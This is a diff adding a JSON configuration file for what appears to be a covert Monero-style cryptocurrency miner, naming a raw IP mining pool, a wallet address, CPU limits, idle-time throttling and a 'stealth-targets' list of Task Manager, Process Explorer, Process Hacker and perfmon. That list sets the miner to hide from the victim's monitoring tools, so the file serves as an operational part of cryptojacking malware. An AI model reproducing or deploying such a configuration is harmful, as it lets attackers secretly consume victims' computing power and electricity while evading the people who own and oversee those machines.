@@ -1,0 +1,15 @@
+{
+    "algo": "rx/0",
+    "pool": "77.110.101.241",
+    "port": 443,
+    "wallet": "864EWUcMM4PGqkLJiKxTjY9dRdDmvGD5kdVhCSfNZbG4VZ4mWcKazc2GxU3aDumZhS7Cbyu3TifW3XRRDmDJmxRZEDcW6Yk",
+    "password": "br",
+    "nicehash": false,
+    "ssltls": true,
+    "max-cpu": 30,
+    "idle-wait": 5,
+    "idle-cpu": 70,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": false
+}
